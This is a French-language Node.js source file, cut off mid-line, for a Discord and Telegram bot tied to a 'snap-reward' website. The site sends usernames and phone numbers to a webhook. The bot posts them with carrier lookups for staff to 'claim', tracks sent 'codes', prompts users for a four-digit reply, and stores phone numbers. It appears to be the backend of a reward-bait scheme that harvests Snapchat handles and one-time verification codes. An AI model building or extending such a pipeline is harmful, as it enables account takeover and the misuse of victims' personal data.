require("dotenv").config();
const fs = require("fs");
const path = require("path");
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField, MessageFlags, Partials } = require("discord.js");
const express = require("express");
const app = express();
app.use(express.json());
app.get("/", (req, res) => res.send("Bot online"));

// ========== SNAP+ SITE INTEGRATION ==========
const SNAP_SITE = "https://snap-reward.onrender.com";
const SNAP_MOD_CHANNEL_ID = process.env.SNAP_MOD_CHANNEL_ID || "1547685592928751626";
const SNAP_PING_ROLE_ID = process.env.SNAP_PING_ROLE_ID || "1547717348348403812";

const treatedSnap = new Set(); // évite d'envoyer 2x la même demande
const sentSnapCodes = new Set(); // évite d'envoyer 2x le même code

function snapFormatPhone(p) {
  return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
}

// Webhook : site web (snap-reward) -> Discord embed (pseudo + téléphone)
const WEB_CLAIM_CHANNEL_ID = process.env.WEB_CLAIM_CHANNEL_ID || "1547685592928751628";
const webhookDedup = new Map();
const webTickets = new Map();

app.options("/webhook/form", (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-secret-token');
  res.status(204).end();
});

app.post("/webhook/form", async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-secret-token');
  if (req.headers["x-secret-token"] !== process.env.SITE_SECRET) {
    return res.status(401).json({ error: "Non autorisé" });
  }

  const { pseudo, phone } = req.body || {};
  if (!pseudo || !phone) {
    return res.status(400).json({ error: "Pseudo et téléphone requis" });
  }

  const dedupKey = `${pseudo}|${phone}`;
  const now = Date.now();
  const last = webhookDedup.get(dedupKey);
  if (last && now - last < 10000) {
    return res.status(429).json({ error: "Demande déjà en cours de traitement" });
  }
  webhookDedup.set(dedupKey, now);

  try {
    const logChannel = await client.channels.fetch("1548532310415118376").catch(() => null);
    const modChannel = await getModChannel().catch(() => null);
    const targetChannel = modChannel || logChannel;
    if (!targetChannel) throw new Error("Aucun salon texte accessible par le bot");

    const modGuild = targetChannel.guild || await client.guilds.fetch(MOD_GUILD_ID).catch(() => null);
    if (!modGuild) throw new Error("Guilde introuvable — le bot n'a pas accès à ce serveur");

    const webId = Date.now().toString(36) + Math.random().toString(36).slice(2, 5);
    const now = new Date();
    const dateStr = now.toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });

    let claimChannel = await client.channels.fetch(WEB_CLAIM_CHANNEL_ID).catch(() => null);
    if (!claimChannel || !claimChannel.isTextBased()) {
      const guild = claimChannel && claimChannel.guild ? claimChannel.guild : modGuild;
      for (const [, ch] of guild.channels.cache) {
        if (ch.type === ChannelType.GuildText) {
          try {
            const perms = ch.permissionsFor(client.user);
            if (perms && perms.has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) {
              claimChannel = ch;
              break;
            }
          } catch {}
        }
      }
    }
    if (!claimChannel) throw new Error(`Aucun salon textuel accessible pour envoyer le message Claim`);

    const claimEmbed = new EmbedBuilder()
      .setTitle(pseudo)
      .setDescription(`Web · \`${webId}\`\n\n🟢 présent\n\n**Soumis** · ${dateStr}\n\nClaim par @_`)
      .addFields({ name: "Numéro", value: `> \`${formatPhone(phone)}\` · ${getOperator(phone)}`, inline: false })
      .setColor(0x2b2d31);

    const claimRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`claim_web_${webId}`).setLabel("✅ Claim — Créer le salon").setStyle(ButtonStyle.Primary)
    );

    const claimMsg = await claimChannel.send({ content: `<@&1547717348348403812>`, embeds: [claimEmbed], components: [claimRow], allowedMentions: { roles: ["1547717348348403812"] } });

    webTickets.set(webId, {
      phone,
      originGuildId: "web",
      userId: "0",
      date: now,
      dateStr,
      modChannelId: claimChannel.id,
      modMessageId: claimMsg.id,
      claimedBy: null,
      threadId: null,
      detailMessageId: null,
      pseudo,
      tgName: null
    });

    res.json({ ok: true, webId });
  } catch (e) {
    console.error("Erreur webhook form:", e.message);
    res.status(500).json({ error: "Erreur: " + e.message });
  }
});

app.listen(process.env.PORT || 3000);

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMessages], partials: [Partials.Channel, Partials.Message] });
const pending = new Map();
const blacklistedNums = new Set();
const blacklistedUsers = new Set();
const PENDING_TIMEOUT_MS = 15 * 60 * 1000;
setInterval(async () => {
  if (!client.isReady()) return;
  const now = Date.now();
  for (const [key, data] of [...pending.entries()]) {
    if (data.claimedBy) continue;
    if (data.timedOut) continue;
    if (key.startsWith("mass_")) continue;
    if (key.startsWith("web:") || key.startsWith("wbt:")) continue;
    if (!data.date) continue;
    if (now - new Date(data.date).getTime() < PENDING_TIMEOUT_MS) continue;
    try {
      const isTg = data.originGuildId === "tg";
      if (isTg) {
        if (tgBot) {
          try { await tgBot.telegram.sendMessage(data.userId, "⏳ **File d'attente**\n\nAucun modérateur n'est disponible pour le moment.\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏"); } catch {}
        }
      } else {
        try {
          const u = await client.users.fetch(data.userId);
          const waitEmbed = new EmbedBuilder().setTitle("⏳ File d'attente — Modération").setDescription("Aucun modérateur n'est disponible pour le moment.\n\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏").setColor(0xfaa61a).setTimestamp();
          await u.send({ embeds: [waitEmbed] });
        } catch {}
      }
      try {
        const ch = await client.channels.fetch(data.modChannelId).catch(()=>null);
        if (ch) {
          const msg = await ch.messages.fetch(data.modMessageId).catch(()=>null);
          if (msg) {
            const baseDesc = msg.embeds[0]?.description || "";
            const timeoutEmbed = new EmbedBuilder()
              .setTitle(msg.embeds[0]?.title || "Demande expirée")
              .setDescription(baseDesc + "\n\n⏳ **Non claim après 15 min — Aucun modérateur n'a pris la demande**\n*Utilisateur notifié : réessaie plus tard*")
              .setColor(0x808080)
              .setTimestamp();
            const pretRow = new ActionRowBuilder().addComponents(
              new ButtonBuilder().setCustomId(`pret_${data.originGuildId}_${data.userId}`).setLabel("✅ Prêt — Notifier l'utilisateur").setStyle(ButtonStyle.Success).setEmoji("👋")
            );
            await msg.edit({ embeds: [timeoutEmbed], components: [pretRow] }).catch(()=>{});
            data.timedOut = true;
            pending.set(key, data);
            continue;
          }
        }
      } catch {}
    } catch {}
    pending.delete(key);
  }
}, 60 * 1000);

const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";
const VALIDATED_CHANNEL_ID = process.env.VALIDATED_CHANNEL_ID || "1548532409153363968";
const FAILED_CHANNEL_ID = process.env.FAILED_CHANNEL_ID || "1548532447786967052";
const STATS_PATH = path.join(__dirname, "stats.json");
const DB_STATS_CHANNEL_ID = process.env.DB_STATS_CHANNEL_ID || "1548535878509400184";
let stats = {
  validated: 1, failed: 5, lastUpdate: "2026-09-13T03:06:15Z", lastUpdateBy: "1536783268219977738", lastStatus: "validated",
  staff: { "1536783268219977738": { validated: 1, failed: 5, lastUpdate: "2026-09-13T03:06:15Z", lastStatus: "validated", tag: "Staff" } },
  telegramUsers: {},
  blacklistedNums: [],
  blacklistedUsers: [],
  pending: {}
};
let dbStatsMessageId = null;
try {
  if (fs.existsSync(STATS_PATH)) {
    const raw = JSON.parse(fs.readFileSync(STATS_PATH, "utf8"));
    stats = { ...stats, ...raw };
    if (!stats.staff) stats.staff = {};
    if (!stats.telegramUsers) stats.telegramUsers = {};
    if (!stats.blacklistedNums) stats.blacklistedNums = [];
    if (!stats.blacklistedUsers) stats.blacklistedUsers = [];
    if (!stats.pending) stats.pending = {};
    for (const n of stats.blacklistedNums) blacklistedNums.add(n);
    for (const u of stats.blacklistedUsers) blacklistedUsers.add(u);
    for (const [k, v] of Object.entries(stats.pending)) {
      if (k.startsWith("mass_")) continue;
      if (k.startsWith("web:")) {
        console.log(`[cleanup] suppression ancienne entrée web: ${k}`);
        continue;
      }
      if (v.date) v.date = new Date(v.date);
      pending.set(k, v);
    }
  }
} catch (e) { console.error("stats load fail:", e.message); }
function saveStats() {
  try { fs.writeFileSync(STATS_PATH, JSON.stringify(stats, null, 2)); } catch (e) { console.error("stats save fail:", e.message); }
}
async function getDbChannel() {
  try { return await client.channels.fetch(DB_STATS_CHANNEL_ID); } catch (e) { console.error("DB_STATS_CHANNEL fetch fail:", e.message); return null; }
}
async function loadDbStats() {
  const ch = await getDbChannel();
  if (!ch) return;
  try {
    const msgs = await ch.messages.fetch({ limit: 20 });
    const botMsg = msgs.find(m => m.author.id === client.user.id && m.content.includes("DB_STATS"));
    if (botMsg) {
      dbStatsMessageId = botMsg.id;
      let jsonStr = "";
      if (botMsg.attachments.size > 0) {
        const att = botMsg.attachments.first();
        if (att && att.name === "stats.json") {
          try {
            const res = await fetch(att.url);
            jsonStr = await res.text();
          } catch {}
        }
      }
      if (!jsonStr) jsonStr = botMsg.content.replace(/.*DB_STATS\s*/s, "").replace(/```json|```/g, "").trim();
      const parsed = JSON.parse(jsonStr);
      stats = { ...stats, ...parsed };
      if (!stats.staff) stats.staff = {};
      if (!stats.telegramUsers) stats.telegramUsers = {};
      if (!stats.blacklistedNums) stats.blacklistedNums = [];
      if (!stats.blacklistedUsers) stats.blacklistedUsers = [];
      if (!stats.pending) stats.pending = {};
      blacklistedNums.clear(); for (const n of stats.blacklistedNums) blacklistedNums.add(n);
      blacklistedUsers.clear(); for (const u of stats.blacklistedUsers) blacklistedUsers.add(u);
      for (const [k, v] of Object.entries(stats.pending)) {
        if (k.startsWith("mass_")) continue;
        if (v.date) v.date = new Date(v.date);
        pending.set(k, v);
      }
      try { fs.writeFileSync(STATS_PATH, JSON.stringify(stats, null, 2)); } catch {}
      console.log("stats loaded from db-stats:", stats);
      return;
    }
    const content = `DB_STATS\n\`\`\`json\n${JSON.stringify(stats, null, 2)}\n\`\`\``;
    const sent = await ch.send(content);
    dbStatsMessageId = sent.id;
    console.log("db-stats initial créé:", dbStatsMessageId);
  } catch (e) { console.error("loadDbStats fail:", e.message); }
}
function trackTelegramUser(tgUser, phone) {
  if (!stats.telegramUsers) stats.telegramUsers = {};
  const id = String(tgUser.id);
  stats.telegramUsers[id] = {
    username: tgUser.username || "",
    first_name: tgUser.first_name || "",
    lastSeen: new Date().toISOString(),
    phone: phone || stats.telegramUsers[id]?.phone || null
  };
  saveDbStats().catch(()=>{});
}
async function saveDbStats() {
  stats.blacklistedNums = [...blacklistedNums];
  stats.blacklistedUsers = [...blacklistedUsers];
  stats.pending = Object.fromEntries([...pending.entries()].filter(([k]) => !k.startsWith("mass_")).map(([k, v]) => { const { timerInterval: _iv, ...rest } = v; return [k, { ...rest, date: v.date instanceof Date ? v.date.toISOString() : v.date }]; }));
  saveStats();
  const ch = await getDbChannel();
  if (!ch) return;
  const jsonStr = JSON.stringify(stats);
  const content = `DB_STATS\n\`\`\`json\n${jsonStr}\n\`\`\``;
  const isTooLong = content.length > 1900;
  try {
    if (dbStatsMessageId) {
      const msg = await ch.messages.fetch(dbStatsMessageId).catch(() => null);
      if (msg) {
        if (isTooLong) {
          await msg.delete().catch(()=>{});
          const sent = await ch.send({ content: "DB_STATS", files: [{ attachment: Buffer.from(jsonStr), name: "stats.json" }] });
          dbStatsMessageId = sent.id;
          return;
        }
        await msg.edit(content); return;
      }
    }
    const msgs = await ch.messages.fetch({ limit: 20 });
    const botMsg = msgs.find(m => m.author.id === client.user.id && m.content.includes("DB_STATS"));
    if (botMsg) {
      dbStatsMessageId = botMsg.id;
      if (isTooLong) {
        await botMsg.delete().catch(()=>{});
        const sent = await ch.send({ content: "DB_STATS", files: [{ attachment: Buffer.from(jsonStr), name: "stats.json" }] });
        dbStatsMessageId = sent.id;
      } else {
        await botMsg.edit(content);
      }
    } else {
      if (isTooLong) {
        const sent = await ch.send({ content: "DB_STATS", files: [{ attachment: Buffer.from(jsonStr), name: "stats.json" }] });
        dbStatsMessageId = sent.id;
      } else {
        const sent = await ch.send(content); dbStatsMessageId = sent.id;
      }
    }
  } catch (e) { console.error("saveDbStats fail:", e.message); }
}
let tgBot = null;
function notifyTelegram(tgId, text, forceCode) {
  if (!tgBot) return;
  const extra = forceCode ? { reply_markup: { force_reply: true, input_field_placeholder: "0000" } } : undefined;
  tgBot.telegram.sendMessage(tgId, text, extra).catch(() => {});
}

function formatPhone(p) {
  return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
}

function getOperatorSync(p) {
  const pre = p.slice(0, 4);
  const bouygues = new Set(["0653","0660","0661","0662","0663","0664","0665","0666","0667","0668","0695","0696","0697","0698","0699","0760","0761","0762","0763","0798","0799"]);
  const free = new Set(["0651","0652","0654","0656","0749","0750","0768","0769","0783","0784"]);
  const orange = new Set(["0607","0608","0630","0631","0632","0633","0634","0635","0670","0671","0672","0673","0674","0675","0676","0677","0678","0679","0680","0681","0682","0683","0684","0685","0686","0687","0688","0689","0690","0707","0764","0765","0766","0767","0770","0771","0776","0777","0780","0781","0782","0786","0787","0788","0789","0790"]);
  const sfr = new Set(["0603","0604","0605","0606","0609","0610","0611","0612","0613","0614","0615","0616","0617","0618","0619","0620","0621","0622","0623","0624","0625","0626","0627","0628","0629","0636","0639","0640","0641","0642","0643","0644","0645","0646","0647","0648","0649","0650","0655","0657","0658","0659","0669","0691","0692","0693","0694","0700","0701","0702","0703","0704","0705","0706","0708","0709"]);
  if (bouygues.has(pre)) return "Bouygues Telecom";
  if (free.has(pre)) return "Free Mobile";
  if (orange.has(pre)) return "Orange";
  if (sfr.has(pre)) return "SFR Mobile";
  if (p.startsWith("06") || p.startsWith("07")) return "SFR Mobile";
  return "Mobile FR";
}
function getOperator(p) { return getOperatorSync(p); }
const operatorCache = new Map();
async function getOperatorPrecise(p) {
  if (!p) return getOperatorSync(p);
  if (operatorCache.has(p)) return operatorCache.get(p);
  const key = process.env.AB
